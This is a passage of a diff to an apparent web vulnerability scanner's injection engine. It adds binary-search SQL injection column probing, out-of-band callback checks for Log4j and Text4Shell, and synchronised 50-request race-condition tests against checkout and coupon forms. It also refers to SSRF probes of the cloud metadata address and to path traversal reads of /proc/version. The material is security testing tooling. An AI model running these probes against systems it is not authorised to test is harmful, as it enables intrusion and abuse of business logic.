                 union_marker = f"DAST_{uuid.uuid4().hex[:6]}"
                 union_result = Detector.sqli_union(last_test_html, results, union_marker)
                 if union_result:
@@ -19563,16 +22737,57 @@ class InjectionEngine:
         if vuln_type == "SSRF" and "169.254.169.254" in payload:
             await self._test_imdsv2_ssrf(url)
         if vuln_type == "SQLi" and "ORDER BY" in payload:
+            # Binary search for column count instead of linear brute-force
+            # Reduces requests from O(n) to O(log n)
             results = []
             last_test_html = ''
-            for order_num in range(1, 20):
-                p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
+            low, high = 1, 50  # Reasonable upper bound for column count
+            
+            # Binary search to find the column count
+            while low <= high:
+                mid = (low + high) // 2
+                p = payload.replace("ORDER BY 1", f"ORDER BY {mid}")
                 resp_test = await self._send_injection(param, p)
                 resp_baseline = await self._send_injection(param, "1")
+                
                 if resp_test and resp_baseline:
                     diff = abs(len(resp_test._body) - len(resp_baseline._body))
-                    results.append((order_num, diff))
+                    results.append((mid, diff))
                     last_test_html = resp_test._body
+                    
+                    # If response differs, we found a valid column count
+                    if diff > 0:
+                        # Try to find the exact boundary
+                        # Check if mid-1 also has a difference
+                        if mid > 1:
+                            p_prev = payload.replace("ORDER BY 1", f"ORDER BY {mid-1}")
+                            resp_prev = await self._send_injection(param, p_prev)
+                            if resp_prev:
+                                diff_prev = abs(len(resp_prev._body) - len(resp_baseline._body))
+                                if diff_prev == 0:
+                                    # Found the exact column count
+                                    break
+                        # Otherwise, search lower half
+                        high = mid - 1
+                    else:
+                        # No difference, search higher half
+                        low = mid + 1
+                else:
+                    # Request failed, stop search
+                    break
+            
+            # Fallback to linear search if binary search didn't find anything
+            if not results or all(diff == 0 for _, diff in results):
+                results = []
+                for order_num in range(1, 20):
+                    p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
+                    resp_test = await self._send_injection(param, p)
+                    resp_baseline = await self._send_injection(param, "1")
+                    if resp_test and resp_baseline:
+                        diff = abs(len(resp_test._body) - len(resp_baseline._body))
+                        results.append((order_num, diff))
+                        last_test_html = resp_test._body
+            
             union_marker = f"DAST_{uuid.uuid4().hex[:6]}"
             union_result = Detector.sqli_union(last_test_html, results, union_marker)
             if union_result:
@@ -19596,8 +22811,10 @@ class InjectionEngine:
             try:
                 session = self.session_manager.async_session.session
                 await warmup_request(session, url)
+            except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                logging.debug(f"Network error during warm-up request: {e}")
             except Exception as e:
-                logging.debug(f"Warm-up request failed: {e}")
+                logging.debug(f"Warm-up request failed: {e}", exc_info=True)
             
             # Paired Request Sampling (The "Jitter Canceller")
             # Send 5 benign requests and 5 malicious requests interleaved in the same TCP session
@@ -19653,8 +22870,12 @@ class InjectionEngine:
                         "confidence": confidence,
                         "cwe": CWE_MAP["SQLi"]
                     })
+            except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                logging.warning(f"Network error during paired request sampling, falling back to legacy method: {e}")
+            except (ValueError, KeyError, TypeError) as e:
+                logging.warning(f"Data processing error during paired request sampling, falling back to legacy method: {e}")
             except Exception as e:
-                logging.warning(f"Paired request sampling failed, falling back to legacy method: {e}")
+                logging.warning(f"Unexpected error during paired request sampling, falling back to legacy method: {e}", exc_info=True)
                 
                 # Fallback to legacy time-based detection with retry logic
                 start = time.perf_counter_ns()
@@ -19725,6 +22946,22 @@ class InjectionEngine:
             
             logging.warning(f"HeuristicRegressionOracle: Confirmed anomaly saved for {url} "
                           f"(payload: {payload[:50]}...)")
+            
+            # Add anomaly as a finding to the vulnerabilities list
+            await self._add_vulnerability({
+                "type": "Heuristic Regression Anomaly",
+                "url": url,
+                "parameter": param.get('name', 'unknown'),
+                "method": method,
+                "payload": payload,
+                "evidence": f"Confirmed anomaly: {resp.status} error reproducible in regression testing. "
+                          f"Response time: {elapsed:.3f}s. Payload triggered consistent server error.",
+                "severity": "Medium",
+                "confidence": 90,
+                "cwe": "CWE-754",  # Improper Check for Unusual or Exceptional Conditions
+                "raw_request": self._build_raw_request_for_storage(method, url, param.get('headers', {}), payload),
+                "request_headers": param.get('headers', {})
+            })
         
         html = self.token_normalizer.normalize(resp._body)
         result = None
@@ -19753,8 +22990,10 @@ class InjectionEngine:
                             js_driver.get(url)
                             await asyncio.sleep(1)
                             baseline_dom = js_driver.page_source
-                        except Exception:
-                            pass
+                        except (ConnectionError, asyncio.TimeoutError):
+                            pass  # Network errors are expected during DOM operations
+                        except Exception as e:
+                            logging.debug(f"Baseline DOM capture error: {e}")
                     
                     # Re-navigate to URL with payload and check live DOM
                     live_dom_result = await Detector.live_dom_xss(url, js_driver, payload, baseline_dom)
@@ -19764,8 +23003,10 @@ class InjectionEngine:
                         if trigger_validation:
                             live_dom_result = trigger_validation
                         await self._add_vulnerability({**live_dom_result, "url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["XSS"]})
+                except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                    logging.warning(f"Network error during live DOM XSS detection: {e}")
                 except Exception as e:
-                    logging.warning(f"Live DOM XSS detection error: {e}")
+                    logging.warning(f"Live DOM XSS detection error: {e}", exc_info=True)
         elif vuln_type == "SQLi":
             # Get time samples for statistical analysis if available
             time_samples = getattr(self, '_baseline_time_samples', None)
@@ -19804,8 +23045,10 @@ class InjectionEngine:
                                 mysql_validation = Detector.validate_boolean_sqli_with_version(mysql_resp, mysql_version_payload)
                                 if mysql_validation:
                                     result = mysql_validation
-                        except Exception:
-                            pass
+                        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError):
+                            pass  # Network errors are expected during validation
+                        except Exception as e:
+                            logging.debug(f"MySQL version validation error: {e}")
                         # If MySQL validation didn't return proof-validated result, try SQLite version query
                         if not result or result.get('type') != 'SQLi (Boolean - Proof-Validated)':
                             try:
@@ -19815,8 +23058,10 @@ class InjectionEngine:
                                     sqlite_validation = Detector.validate_boolean_sqli_with_version(sqlite_resp, sqlite_version_payload)
                                     if sqlite_validation:
                                         result = sqlite_validation
-                            except Exception:
-                                pass
+                            except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError):
+                                pass  # Network errors are expected during validation
+                            except Exception as e:
+                                logging.debug(f"SQLite version validation error: {e}")
             if not result and self.oob_dns_ip and "LOAD_FILE" in payload:
                 if await check_dns_callback(marker, self.oob_dns_domain, self.oob_dns_ip):
                     confidence = calculate_evidence_based_confidence(
@@ -19845,8 +23090,10 @@ class InjectionEngine:
                             safe_read_validation = Detector.validate_path_traversal_safe_file_read(proc_html, baseline_html)
                             if safe_read_validation:
                                 result = safe_read_validation
+                    except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                        logging.warning(f"Network error during path traversal /proc/version validation: {e}")
                     except Exception as e:
-                        logging.warning(f"Path traversal /proc/version validation failed: {e}")
+                        logging.warning(f"Path traversal /proc/version validation failed: {e}", exc_info=True)
         elif vuln_type == "CommandInjection":
             result = Detector.command_injection(html, baseline_html)
             if not result and ("ping" in payload or "nslookup" in payload or "curl" in payload or "wget" in payload):
@@ -19907,7 +23154,7 @@ class InjectionEngine:
             result = Detector.log4j(html, payload, oob_results, marker)
             if not result and self.enable_advanced_oob and self.https_oob_port:
                 # Use persistent callback waiting for HTTPS OOB
-                callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+                callback_result = await wait_for_oob_callback_async(marker, timeout_seconds=30, check_interval=0.5)
                 if callback_result:
                     confidence = calculate_evidence_based_confidence(
                         evidence_strength='critical',
@@ -19955,7 +23202,7 @@ class InjectionEngine:
                 result = {"type":"Text4Shell","confidence":confidence,"evidence":"Text4Shell pattern detected"}
             if not result and self.enable_advanced_oob:
                 # Use persistent callback waiting for OOB detection
-                callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+                callback_result = await wait_for_oob_callback_async(marker, timeout_seconds=30, check_interval=0.5)
                 if callback_result:
                     confidence = calculate_evidence_based_confidence(
                         evidence_strength='critical',
@@ -19984,17 +23231,21 @@ class InjectionEngine:
             test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
             try:
                 return await self._async_fetch(test_url)
-            except Exception as e:
-                logging.warning(f"Selenium crashed during GET injection - attempting recovery: {e}")
+            except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                logging.warning(f"Network error during GET injection - attempting recovery: {e}")
                 if self.selenium_driver:
                     try:
                         logging.warning("Restarting Selenium driver")
-                        self.selenium_driver.quit()
-                        if self.selenium_driver.create():
+                        self.selenium_driver.__exit__(None, None, None)
+                        self.selenium_driver.__enter__()
+                        if self.selenium_driver.driver:
                             self.selenium_ready = True
                             return await self._async_fetch(test_url)
                     except Exception as recovery_error:
-                        logging.error(f"Selenium recovery failed: {recovery_error}")
+                        logging.error(f"Selenium recovery failed: {recovery_error}", exc_info=True)
+                raise
+            except Exception as e:
+                logging.warning(f"Unexpected error during GET injection: {e}", exc_info=True)
                 raise
         else:
             if ptype == 'json':
@@ -20012,22 +23263,26 @@ class InjectionEngine:
                         try:
                             try:
                                 resp = await self._async_fetch(url, method='POST', json_data=mutated_json)
-                            except Exception as e:
-                                logging.warning(f"Selenium crashed during JSON mutation - attempting recovery: {e}")
+                            except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                                logging.warning(f"Network error during JSON mutation - attempting recovery: {e}")
                                 if self.selenium_driver:
                                     try:
                                         logging.warning("Restarting Selenium driver")
-                                        self.selenium_driver.quit()
-                                        if self.selenium_driver.create():
+                                        self.selenium_driver.__exit__(None, None, None)
+                                        self.selenium_driver.__enter__()
+                                        if self.selenium_driver.driver:
                                             self.selenium_ready = True
                                             resp = await self._async_fetch(url, method='POST', json_data=mutated_json)
                                         else:
                                             raise
                                     except Exception as recovery_error:
-                                        logging.error(f"Selenium recovery failed: {recovery_error}")
+                                        logging.error(f"Selenium recovery failed: {recovery_error}", exc_info=True)
                                         raise
                                 else:
                                     raise
+                            except Exception as e:
+                                logging.warning(f"Unexpected error during JSON mutation: {e}", exc_info=True)
+                                raise
                             if resp and resp.status != 400:  # Skip 400 Bad Request (corrupted headers)
                                 return resp
                         except Exception as e:
@@ -20037,35 +23292,33 @@ class InjectionEngine:
                     # Fallback to original if all mutations fail
                     try:
                         return await self._async_fetch(url, method='POST', json_data={pname: payload})
-                    except Exception as e:
-                        logging.warning(f"Selenium crashed during JSON fallback - attempting recovery: {e}")
+                    except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                        logging.warning(f"Network error during JSON fallback - attempting recovery: {e}")
                         if self.selenium_driver:
                             try:
                                 logging.warning("Restarting Selenium driver")
-                                self.selenium_driver.quit()
-                                if self.selenium_driver.create():
+                                self.selenium_driver.__exit__(None, None, None)
+                                self.selenium_driver.__enter__()
+                                if self.selenium_driver.driver:
                                     self.selenium_ready = True
                                     return await self._async_fetch(url, method='POST', json_data={pname: payload})
                             except Exception as recovery_error:
-                                logging.error(f"Selenium recovery failed: {recovery_error}")
+                                logging.error(f"Selenium recovery failed: {recovery_error}", exc_info=True)
                                 raise
                         raise
-                except Exception as e:
-                    logging.debug(f"JSON grammar fuzzing failed, using standard: {e}")
+                except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                    logging.debug(f"Network error during JSON grammar fuzzing, using standard: {e}")
                     try:
                         return await self._async_fetch(url, method='POST', json_data={pname: payload})
                     except Exception as e:
-                        logging.warning(f"Selenium crashed during JSON standard - attempting recovery: {e}")
-                        if self.selenium_driver:
-                            try:
-                                logging.warning("Restarting Selenium driver")
-                                self.selenium_driver.quit()
-                                if self.selenium_driver.create():
-                                    self.selenium_ready = True
-                                    return await self._async_fetch(url, method='POST', json_data={pname: payload})
-                            except Exception as recovery_error:
-                                logging.error(f"Selenium recovery failed: {recovery_error}")
-                                raise
+                        logging.warning(f"Network error during JSON standard - attempting recovery: {e}", exc_info=True)
+                        raise
+                except Exception as e:
+                    logging.debug(f"JSON grammar fuzzing failed, using standard: {e}", exc_info=True)
+                    try:
+                        return await self._async_fetch(url, method='POST', json_data={pname: payload})
+                    except Exception as e:
+                        logging.warning(f"Unexpected error during JSON standard: {e}", exc_info=True)
                         raise
             elif ptype == 'xml':
                 # Use grammar-based XML fuzzing instead of raw byte corruption
@@ -20081,23 +23334,27 @@ class InjectionEngine:
                             try:
                                 resp = await self._async_fetch(url, method='POST', data=mutated_xml,
                                                               headers={'Content-Type': 'application/xml'})
-                            except Exception as e:
-                                logging.warning(f"Selenium crashed during XML mutation - attempting recovery: {e}")
+                            except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                                logging.warning(f"Network error during XML mutation - attempting recovery: {e}")
                                 if self.selenium_driver:
                                     try:
                                         logging.warning("Restarting Selenium driver")
-                                        self.selenium_driver.quit()
-                                        if self.selenium_driver.create():
+                                        self.selenium_driver.__exit__(None, None, None)
+                                        self.selenium_driver.__enter__()
+                                        if self.selenium_driver.driver:
                                             self.selenium_ready = True
                                             resp = await self._async_fetch(url, method='POST', data=mutated_xml,
                                                                           headers={'Content-Type': 'application/xml'})
                                         else:
                                             raise
                                     except Exception as recovery_error:
-                                        logging.error(f"Selenium recovery failed: {recovery_error}")
+                                        logging.error(f"Selenium recovery failed: {recovery_error}", exc_info=True)
                                         raise
                                 else:
                                     raise
+                            except Exception as e:
+                                logging.warning(f"Unexpected error during XML mutation: {e}", exc_info=True)
+                                raise
                             if resp and resp.status != 400:  # Skip 400 Bad Request (corrupted headers)
                                 return resp
                         except Exception as e:
@@ -20107,51 +23364,53 @@ class InjectionEngine:
                     # Fallback to original if all mutations fail
                     try:
                         return await self._async_fetch(url, method='POST', data={pname: payload})
-                    except Exception as e:
-                        logging.warning(f"Selenium crashed during XML fallback - attempting recovery: {e}")
+                    except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                        logging.warning(f"Network error during XML fallback - attempting recovery: {e}")
                         if self.selenium_driver:
                             try:
                                 logging.warning("Restarting Selenium driver")
-                                self.selenium_driver.quit()
-                                if self.selenium_driver.create():
+                                self.selenium_driver.__exit__(None, None, None)
+                                self.selenium_driver.__enter__()
+                                if self.selenium_driver.driver:
                                     self.selenium_ready = True
                                     return await self._async_fetch(url, method='POST', data={pname: payload})
                             except Exception as recovery_error:
-                                logging.error(f"Selenium recovery failed: {recovery_error}")
+                                logging.error(f"Selenium recovery failed: {recovery_error}", exc_info=True)
                                 raise
                         raise
-                except Exception as e:
-                    logging.debug(f"XML grammar fuzzing failed, using standard: {e}")
+                except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                    logging.debug(f"Network error during XML grammar fuzzing, using standard: {e}")
                     try:
                         return await self._async_fetch(url, method='POST', data={pname: payload})
                     except Exception as e:
-                        logging.warning(f"Selenium crashed during XML standard - attempting recovery: {e}")
-                        if self.selenium_driver:
-                            try:
-                                logging.warning("Restarting Selenium driver")
-                                self.selenium_driver.quit()
-                                if self.selenium_driver.create():
-                                    self.selenium_ready = True
-                                    return await self._async_fetch(url, method='POST', data={pname: payload})
-                            except Exception as recovery_error:
-                                logging.error(f"Selenium recovery failed: {recovery_error}")
-                                raise
+                        logging.warning(f"Network error during XML standard - attempting recovery: {e}", exc_info=True)
+                        raise
+                except Exception as e:
+                    logging.debug(f"XML grammar fuzzing failed, using standard: {e}", exc_info=True)
+                    try:
+                        return await self._async_fetch(url, method='POST', data={pname: payload})
+                    except Exception as e:
+                        logging.warning(f"Unexpected error during XML standard: {e}", exc_info=True)
                         raise
             else:
                 try:
                     return await self._async_fetch(url, method='POST', data={pname: payload})
-                except Exception as e:
-                    logging.warning(f"Selenium crashed during POST injection - attempting recovery: {e}")
+                except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                    logging.warning(f"Network error during POST injection - attempting recovery: {e}")
                     if self.selenium_driver:
                         try:
                             logging.warning("Restarting Selenium driver")
-                            self.selenium_driver.quit()
-                            if self.selenium_driver.create():
+                            self.selenium_driver.__exit__(None, None, None)
+                            self.selenium_driver.__enter__()
+                            if self.selenium_driver.driver:
                                 self.selenium_ready = True
                                 return await self._async_fetch(url, method='POST', data={pname: payload})
                         except Exception as recovery_error:
-                            logging.error(f"Selenium recovery failed: {recovery_error}")
+                            logging.error(f"Selenium recovery failed: {recovery_error}", exc_info=True)
                             raise
+                    raise
+                except Exception as e:
+                    logging.warning(f"Unexpected error during POST injection: {e}", exc_info=True)
                     raise
     async def second_order_injection_tests(self):
         self.log("Second-order injection tests...")
@@ -20161,12 +23420,13 @@ class InjectionEngine:
         # Track injection points for later verification with full context
         self.injection_points = []
         
-        for page in self.crawler_engine.crawled_pages:
-            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
-            if not page_data:
-                continue
-            html = page_data.get('html_content', '')
-            soup = BeautifulSoup(html, 'html.parser')
+        for page in self.crawler_engine._get_crawled_pages_iterator():
+            if not page.get('html'):
+                # Load HTML from disk if not already loaded
+                html = self.crawler_engine._get_html_content(page['url'])
+                page['html'] = html if html else ''
+            html = page.get('html', '')
+            soup = get_cached_soup(html, 'html.parser')
             for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                 action = urljoin(page['url'], form.get('action',''))
                 fields = [inp.get('name') for inp in form.find_all(['input','textarea','select']) if inp.get('name')]
@@ -20241,7 +23501,7 @@ class InjectionEngine:
             
             # Check for OOB callbacks (more frequent) with persistent waiting
             # Check for stored XSS markers using persistent callback detection
-            stored_xss_callback = wait_for_oob_callback("DAST_STORED_XSS", timeout_seconds=30, check_interval=0.5)
+            stored_xss_callback = await wait_for_oob_callback_async("DAST_STORED_XSS", timeout_seconds=30, check_interval=0.5)
             if stored_xss_callback:
                 confidence = calculate_evidence_based_confidence(
                     evidence_strength='critical',
@@ -20367,40 +23627,55 @@ class InjectionEngine:
             return
         
         # Re-crawl starting from known entry points with a shallow depth
-        for page in self.crawler_engine.crawled_pages[:5]:  # Limit to first 5 pages
+        pages_list = list(self.crawler_engine._get_crawled_pages_iterator())
+        for page in pages_list[:5]:  # Limit to first 5 pages
             try:
                 await self.crawler_engine.crawl(page['url'], max_depth=2)
             except Exception as e:
                 logging.debug(f"Re-crawl error for {page['url']}: {e}")
     async def race_condition_tests(self):
+        # Initialize FSM for state-aware race condition testing
+        fsm = BusinessLogicFSM()
+        
         target_urls = set()
-        for page in self.crawler_engine.crawled_pages:
-            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
-            if not page_data:
-                continue
-            html = page_data.get('html_content', '')
-            soup = BeautifulSoup(html, 'html.parser')
+        for page in self.crawler_engine._get_crawled_pages_iterator():
+            if not page.get('html'):
+                # Load HTML from disk if not already loaded
+                html = self.crawler_engine._get_html_content(page['url'])
+                page['html'] = html if html else ''
+            html = page.get('html', '')
+            soup = get_cached_soup(html, 'html.parser')
             for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                 form_text = form.get_text().lower()
                 if any(kw in form_text for kw in ['redeem','coupon','transfer','checkout','order']):
                     action = urljoin(page['url'], form.get('action',''))
                     target_urls.add(action)
+                    
+                    # Learn state sequence from form discovery
+                    current_state = fsm.detect_state_from_url(action)
+                    fsm.add_transition('browse', current_state, 'form_discovery', {'url': action})
+        
         if not target_urls:
             self.log("No race condition candidate endpoints found. Skipping race condition tests.")
             return
         for url in target_urls:
-            # Enhanced race condition testing with multiple scenarios
-            # These calls don't use session manager as they're basic tests
-            await self._test_basic_race_condition(url)
-            await self._test_race_condition_timing(url)
-            await self._test_parallel_resource_allocation(url)
-            await self._test_concurrent_state_transitions(url)
-            await self._test_idempotency_violation(url)
+            # Enhanced race condition testing with FSM integration
+            # FSM-aware race condition testing with state context
+            await self._test_basic_race_condition(url, fsm_context=fsm)
+            await self._test_race_condition_timing(url, fsm_context=fsm)
+            await self._test_parallel_resource_allocation(url, fsm_context=fsm)
+            await self._test_concurrent_state_transitions(url, fsm_context=fsm)
+            await self._test_idempotency_violation(url, fsm_context=fsm)
         
-        # Run advanced race condition tests on discovered endpoints
-        await self._run_advanced_race_condition_tests()
+        # Run advanced race condition tests on discovered endpoints with FSM
+        await self._run_advanced_race_condition_tests(fsm)
+        
+        # Log FSM state at end of testing
+        fsm_state = fsm.export_fsm_state()
+        logging.info(f"FSM State after race condition testing: {fsm_state['current_state']}")
+        logging.info(f"Learned {len(fsm_state['learned_sequences'])} state sequences")
     
-    async def _run_advanced_race_condition_tests(self):
+    async def _run_advanced_race_condition_tests(self, fsm=None):
         try:
             # Initialize session manager for advanced tests
             session_manager = SessionStateManager()
@@ -20411,12 +23686,13 @@ class InjectionEngine:
             transaction_urls = set()
             purchase_urls = set()
             
-            for page in self.crawler_engine.crawled_pages:
-                page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
-                if not page_data:
-                    continue
-                html = page_data.get('html_content', '')
-                soup = BeautifulSoup(html, 'html.parser')
+            for page in self.crawler_engine._get_crawled_pages_iterator():
+                if not page.get('html'):
+                    # Load HTML from disk if not already loaded
+                    html = self.crawler_engine._get_html_content(page['url'])
+                    page['html'] = html if html else ''
+                html = page.get('html', '')
+                soup = get_cached_soup(html, 'html.parser')
                 
                 # Discover password reset endpoints
                 for form in soup.find_all('form'):
@@ -20469,39 +23745,81 @@ class InjectionEngine:
             
             for purchase_url in purchase_urls:
                 session_id = session_manager.create_session()
-                await self.test_inventory_oversell(purchase_url, "product_123", 1, session_manager, session_id)
+                # Try to find corresponding cart URL for the purchase endpoint
+                cart_url = purchase_url.replace('/purchase', '/cart').replace('/checkout', '/cart').replace('/buy', '/cart')
+                if cart_url == purchase_url:
+                    cart_url = purchase_url.rsplit('/', 1)[0] + '/cart'
+                
+                # Use new cart lock timing-aware race condition testing
+                try:
+                    await self._test_race_condition_with_cart_lock_timing(cart_url, purchase_url, session_manager, session_id)
+                except Exception as e:
+                    logging.debug(f"Cart lock timing test failed, falling back to inventory oversell test: {e}")
+                    await self.test_inventory_oversell(purchase_url, None, 1, session_manager, session_id)
+                
                 session_manager.destroy_session(session_id)
             
         except Exception as e:
             logging.warning(f"Advanced race condition tests error: {e}")
     
-    async def _test_basic_race_condition(self, url, session_manager: SessionStateManager = None, session_id: str = None):
+    async def _test_basic_race_condition(self, url, session_manager: SessionStateManager = None, session_id: str = None, fsm_context=None):
         try:
             logging.info(f"[RACE CONDITION] Testing basic race condition at {url} with session {session_id}")
+            
+            # FSM-aware race condition testing
+            current_state = 'unknown'
+            next_state = 'unknown'
+            fsm_should_test = True
+            
+            if fsm_context:
+                current_state = fsm_context.detect_state_from_url(url)
+                fsm_should_test = fsm_context.should_test_race_condition(current_state)
+                logging.info(f"[FSM] Current state: {current_state}, Should test race condition: {fsm_should_test}")
+                
+                if fsm_should_test:
+                    # Get optimal injection point from FSM
+                    injection_point = fsm_context.get_optimal_race_injection_point(current_state)
+                    if injection_point:
+                        logging.info(f"[FSM] Using optimal injection point: {injection_point['window']}")
+            
+            if not fsm_should_test:
+                logging.info(f"[FSM] Skipping race condition test for state: {current_state}")
+                return
             
             # Enhanced race condition test using ThreadPoolExecutor for precise timing
             import concurrent.futures
             import threading
+            
+            # Use FSM-informed timing strategies if available
+            time_deltas = [0, 10, 50, 100]  # Default timing deltas
+            if fsm_context:
+                injection_point = fsm_context.get_optimal_race_injection_point(current_state)
+                if injection_point and 'time_deltas' in injection_point:
+                    time_deltas = injection_point['time_deltas']
             
             # Use ThreadPoolExecutor for better race condition timing
             num_requests = 50
             results = []
             barrier = threading.Barrier(num_requests)
             
-            def synchronized_request():
+            def synchronized_request(timing_delta=0):
                 """Send request synchronized with barrier for exact timing."""
                 try:
                     # Wait for all threads to be ready
                     barrier.wait()
                     
+                    # Apply timing delta for state-transition-aware testing
+                    if timing_delta > 0:
+                        time.sleep(timing_delta / 1000.0)  # Convert to seconds
+                    
                     # Send request immediately after barrier release
                     if session_manager and session_id:
-                        session_cookies = session_manager.get_session_cookies(session_id)
-                        session_headers = session_manager.get_session_headers(session_id)
                         # Run async fetch in thread pool
                         loop = asyncio.new_event_loop()
                         asyncio.set_event_loop(loop)
                         try:
+                            session_cookies = loop.run_until_complete(session_manager.get_session_cookies(session_id))
+                            session_headers = loop.run_until_complete(session_manager.get_session_headers(session_id))
                             resp = loop.run_until_complete(
                                 self._async_fetch(url, method='POST', data={"test":"race"},
                                                cookies=session_cookies, headers=session_headers)
@@ -20523,9 +23841,13 @@ class InjectionEngine:
                     logging.debug(f"Synchronized request error: {e}")
                     return None
             
-            # Execute all requests simultaneously using ThreadPoolExecutor
+            # Execute all requests simultaneously using ThreadPoolExecutor with timing deltas
             with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
-                futures = [executor.submit(synchronized_request) for _ in range(num_requests)]
+                # Distribute timing deltas across requests for state-transition testing
+                futures = []
+                for i in range(num_requests):
+                    timing_delta = time_deltas[i % len(time_deltas)]
+                    futures.append(executor.submit(synchronized_request, timing_delta))
                 responses = [future.result() for future in concurrent.futures.as_completed(futures)]
             
             # Update session from responses if session manager provided
@@ -20544,6 +23866,8 @@ class InjectionEngine:
                     specificity='medium',
                     false_positive_resistance='medium'
                 )
+                
+                # Add FSM context to vulnerability report
                 race_vuln = {
                     "type":"Potential Race Condition","url":url,"parameter":"*",
                     "evidence":f"{len(successful_responses)}/{num_requests} synchronized requests succeeded",
@@ -20553,15 +23877,36 @@ class InjectionEngine:
                         "timing_anomalies": 0,
                         "consistency_score": 0.8,
                         "race_window_size": num_requests
-                    }
+                    },
+                    "fsm_context": {
+                        "state": current_state,
+                        "timing_strategy": time_deltas,
+                        "state_aware": fsm_context is not None
+                    } if fsm_context else None
                 }
                 await self._add_vulnerability(race_vuln)
+                
+                # Update FSM with successful transition if context available
+                if fsm_context:
+                    fsm_context.add_transition(current_state, next_state, 'race_condition_test', {
+                        'url': url,
+                        'success': True,
+                        'responses': len(successful_responses)
+                    })
         except Exception as e:
             logging.warning(f"Basic race condition test error: {e}")
     
-    async def _test_parallel_resource_allocation(self, url, session_manager: SessionStateManager = None, session_id: str = None):
+    async def _test_parallel_resource_allocation(self, url, session_manager: SessionStateManager = None, session_id: str = None, fsm_context=None):
         try:
             logging.info(f"[RACE CONDITION] Testing parallel resource allocation at {url} with session {session_id}")
+            
+            # FSM-aware testing
+            current_state = 'unknown'
+            if fsm_context:
+                current_state = fsm_context.detect_state_from_url(url)
+                if not fsm_context.should_test_race_condition(current_state):
+                    logging.info(f"[FSM] Skipping parallel resource allocation test for state: {current_state}")
+                    return
             
             # Test parallel resource allocation using ThreadPoolExecutor and Barrier
             import concurrent.futures
@@ -20589,11 +23934,11 @@ class InjectionEngine:
                     
                     # Send request immediately after barrier release
                     if session_manager and session_id:
-                        session_cookies = session_manager.get_session_cookies(session_id)
-                        session_headers = session_manager.get_session_headers(session_id)
                         loop = asyncio.new_event_loop()
                         asyncio.set_event_loop(loop)
                         try:
+                            session_cookies = loop.run_until_complete(session_manager.get_session_cookies(session_id))
+                            session_headers = loop.run_until_complete(session_manager.get_session_headers(session_id))
                             resp = loop.run_until_complete(
                                 self._async_fetch(url, method='POST', data=test_data,
                                                cookies=session_cookies, headers=session_headers)
@@ -20691,9 +24036,17 @@ class InjectionEngine:
         
         return ResponseObject(result)
     
-    async def _test_concurrent_state_transitions(self, url, session_manager: SessionStateManager = None, session_id: str = None):
+    async def _test_concurrent_state_transitions(self, url, session_manager: SessionStateManager = None, session_id: str = None, fsm_context=None):
         try:
             logging.info(f"[RACE CONDITION] Testing concurrent state transitions at {url} with session {session_id}")
+            
+            # FSM-aware testing
+            current_state = 'unknown'
+            if fsm_context:
+                current_state = fsm_context.detect_state_from_url(url)
+                if not fsm_context.should_test_race_condition(current_state):
+                    logging.info(f"[FSM] Skipping concurrent state transitions test for state: {current_state}")
+                    return
             
             # Test concurrent state transitions using ThreadPoolExecutor and Barrier
             import concurrent.futures
@@ -20792,9 +24145,17 @@ class InjectionEngine:
         except Exception as e:
             logging.warning(f"Concurrent state transition test error: {e}")
     
-    async def _test_idempotency_violation(self, url, session_manager: SessionStateManager = None, session_id: str = None):
+    async def _test_idempotency_violation(self, url, session_manager: SessionStateManager = None, session_id: str = None, fsm_context=None):
         try:
             logging.info(f"[RACE CONDITION] Testing idempotency violation at {url} with session {session_id}")
+            
+            # FSM-aware testing
+            current_state = 'unknown'
+            if fsm_context:
+                current_state = fsm_context.detect_state_from_url(url)
+                if not fsm_context.should_test_race_condition(current_state):
+                    logging.info(f"[FSM] Skipping idempotency violation test for state: {current_state}")
+                    return
             
             # Test idempotency using ThreadPoolExecutor and Barrier
             import concurrent.futures
@@ -20889,9 +24250,17 @@ class InjectionEngine:
         except Exception as e:
             logging.warning(f"Idempotency violation test error: {e}")
     
-    async def _test_race_condition_timing(self, url, session_manager: SessionStateManager = None, session_id: str = None):
+    async def _test_race_condition_timing(self, url, session_manager: SessionStateManager = None, session_id: str = None, fsm_context=None):
         try:
             logging.info(f"[RACE CONDITION TIMING] Testing race condition timing at {url} with session {session_id}")
+            
+            # FSM-aware testing
+            current_state = 'unknown'
+            if fsm_context:
+                current_state = fsm_context.detect_state_from_url(url)
+                if not fsm_context.should_test_race_condition(current_state):
+                    logging.info(f"[FSM] Skipping race condition timing test for state: {current_state}")
+                    return
             
             # Test race condition timing using ThreadPoolExecutor and Barrier
             import concurrent.futures
@@ -21017,16 +24386,31 @@ class InjectionEngine:
             for delay in time_delays:
                 num_requests = 4
                 results = []
-                start_time = time.time()
+                start_time = time.perf_counter()
                 
-                def staggered_request(delay_offset):
+                # Barrier for synchronization
+                barrier = threading.Barrier(num_requests)
+                
+                def staggered_request(delay_offset, request_id):
                     """Send request with specific delay offset."""
                     try:
